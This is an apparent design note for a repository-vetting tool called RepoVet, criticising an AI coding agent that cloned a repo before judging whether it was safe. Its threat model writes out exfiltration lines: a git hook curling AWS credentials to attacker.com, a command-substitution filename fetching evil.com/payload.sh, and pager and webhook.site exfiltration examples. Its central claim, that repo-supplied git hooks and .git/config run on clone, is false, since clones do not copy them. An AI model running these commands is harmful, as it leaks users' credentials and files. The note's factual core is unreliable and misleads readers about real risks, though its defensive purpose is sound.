# CRITICAL: Claude Code Clones Before Assessing Safety

**Question asked:** "is this repo safe to open with claude code?"

**What Claude Code did:**

```bash
cd /tmp && rm -rf agent_flywheel_clawdbot_skills_and_integrations && \
  git clone https://github.com/dicklesworthstone/...
```

**THEN** started assessing safety.

---

## The Problem

### The Catch-22 Realized:

1. User asks: "Is this safe?"
2. Claude Code thinks: "I need to inspect it to answer that"
3. **Claude Code clones the repo** into `/tmp`
4. **Claude Code runs commands inside it** (`cd /tmp/repo && find ...`)
5. **Claude Code reads files from it**
6. **THEN** Claude Code says: "Yes, it's safe to open"

**But it's already been opened.** Any auto-execution mechanisms have already fired.

---

## Attack Vectors Claude Code Exposed Itself To

### 1. Git Hooks (post-checkout, post-merge)
If the repo contained `.git/hooks/post-checkout`:
```bash
#!/bin/bash
curl -X POST https://attacker.com/collect -d "victim=$(whoami)@$(hostname)"
cat ~/.aws/credentials | curl -X POST https://attacker.com/aws
```

**This would run immediately on `git clone` BEFORE Claude Code even started inspecting.**

Status: **Claude Code would be compromised before it could warn you.**

---

### 2. Malicious Filenames
If the repo contained a file named:
```
$(curl evil.com/payload.sh | bash).md
```

When Claude Code ran:
```bash
find . -name "*.md"
```

The filename could trigger execution (depending on shell configuration).

Status: **Low probability, but possible.**

---

### 3. Symlink Attacks
If the repo contained:
```
skills/evil-skill.md -> /home/shapor/.ssh/id_rsa
```

When Claude Code ran:
```bash
cat skills/evil-skill.md
```

It would read and potentially leak your SSH private key.

Status: **If Claude Code output was logged/transmitted, key is compromised.**

---

### 4. .git/config Malicious Settings
If `.git/config` contained:
```ini
[core]
  pager = curl evil.com?data=$(cat ~/.bashrc | base64)
```

Any git command that triggers the pager would exfiltrate data.

Status: **If Claude Code ran git commands, potential exfil.**

---

### 5. Malicious Submodules
If `.gitmodules` pointed to a malicious repo:
```ini
[submodule "deps"]
  path = deps
  url = https://attacker.com/malicious-submodule
```

Clone with `--recursive` would fetch and execute submodule hooks.

Status: **Depends on git clone flags, likely safe this time.**

---

## What Claude Code Should Have Done

### Option 1: Shallow Fetch Without Executing
```bash
# Fetch repo metadata without cloning
gh api repos/dicklesworthstone/agent_flywheel_clawdbot_skills_and_integrations

# Fetch specific files via GitHub API (no git hooks execute)
curl https://raw.githubusercontent.com/.../install.sh

# Analyze BEFORE cloning
```

**Pros:** No local execution, no hooks fire
**Cons:** Can't see full repo structure, limited to API rate limits

---

### Option 2: Clone in Isolated Container
```bash
# Clone inside disposable Docker container with no network
docker run --rm --network=none alpine/git clone [url] /tmp/repo
docker cp container:/tmp/repo ./local-safe-copy

# Now inspect the local copy (git hooks already ran in isolated container)
```

**Pros:** Hooks fire in isolation, can't exfiltrate
**Cons:** Complex, requires Docker

---

### Option 3: Use RepoVet FIRST
```bash
# Don't clone yet
repovet scan https://github.com/dicklesworthstone/...

# RepoVet uses GitHub API to fetch files WITHOUT cloning
# Analyzes for threats
# THEN tells you if it's safe to clone
```

**Pros:** No local execution until verified safe
**Cons:** Requires RepoVet to exist (hence this project!)

---

## The Correct Workflow

### UNSAFE (what Claude Code did):
```
User: "Is this safe?"
  → Claude: clone repo
  → Claude: run commands in it
  → Claude: read files from it
  → Claude: "Yes, it's safe"
```

### SAFE (what should happen):
```
User: "Is this safe?"
  → Claude: fetch via API (no clone)
  → Claude: analyze contents
  → Claude: "Here's what it would do if you clone it"
  → User: decides whether to proceed
  → Claude: (only clones if user approves)
```

---

## Why This Matters for RepoVet

**This is the CORE value proposition:**

> "Claude Code clones repos to inspect them — but that means it's already trusted them. RepoVet inspects WITHOUT cloning, using GitHub API and static analysis. You only clone AFTER you know it's safe."

**Pitch update:**
> "I asked Claude Code: 'Is this repo safe to open?' It cloned the repo into /tmp and started running commands inside it — BEFORE telling me if it was safe. Any git hooks had already executed. Any malicious symlinks were already traversed. That's the paradox RepoVet solves: inspect FIRST, clone SECOND."

---

## New Test Case: Malicious Git Hook

Create a test repo with:
```bash
.git/hooks/post-checkout:
#!/bin/bash
echo "[$(date)] Cloned by $(whoami)@$(hostname)" | \
  curl -X POST https://webhook.site/your-unique-url -d @-
```

**When Claude Code assesses it:**
- The hook fires on clone
- Data is exfiltrated to webhook.site
- Claude Code then says "it's safe"

**When RepoVet assesses it:**
- Fetches `.git/hooks/post-checkout` via API (no clone)
- Detects: "This repo has a post-checkout hook that makes a network call"
- Warns: "Don't clone this — hook will execute on clone"
- User can decide

---

## Immediate Action Items

1. **Add this to RepoVet pitch:**
   - Show Claude Code cloning before assessing
   - Highlight the premature trust
   - Position RepoVet as "inspect first, clone second"

2. **Create test repo with malicious git hook:**
   - `repovet-test-git-hook-exfil`
   - Demonstrate Claude Code clones it (hook fires)
   - Demonstrate RepoVet catches it (no clone)

3. **Update threat model to include git hooks:**
   - `.git/hooks/post-checkout`
   - `.git/hooks/post-merge`
   - `.git/config` malicious settings
   - `.gitmodules` submodule attacks

---

## Conclusion

**You were 100% right to be alarmed.**

Claude Code's approach to "is this safe?" is fundamentally flawed:
- It can't assess without cloning
- But cloning means trusting
- So it trusts, then assesses, then tells you it was safe to trust

**RepoVet breaks the cycle:** Assess via API → Report findings → User decides → Only then clone.

This is the killer demo.
